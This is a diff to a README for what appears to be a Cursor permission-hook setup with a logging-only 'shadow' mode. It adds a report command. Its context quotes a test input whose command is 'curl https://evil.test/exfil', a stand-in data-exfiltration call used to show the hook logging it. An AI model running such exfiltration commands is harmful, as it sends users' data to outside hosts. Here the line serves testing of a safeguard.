@@ -33,6 +33,12 @@ echo '{"conversation_id":"test","command":"curl https://evil.test/exfil"}' | pnp
 
 In SHADOW mode the second command still returns `"permission":"allow"` and appends a `shadow` line to the ledger.
 
+Summarize all session files:
+
+```bash
+pnpm run cursor:shadow-report
+```
+
 ## Enable in Cursor
 
 Hooks load from `.cursor/hooks.json` when this folder is the workspace root. Restart Cursor if hooks do not appear in **Settings → Hooks**.
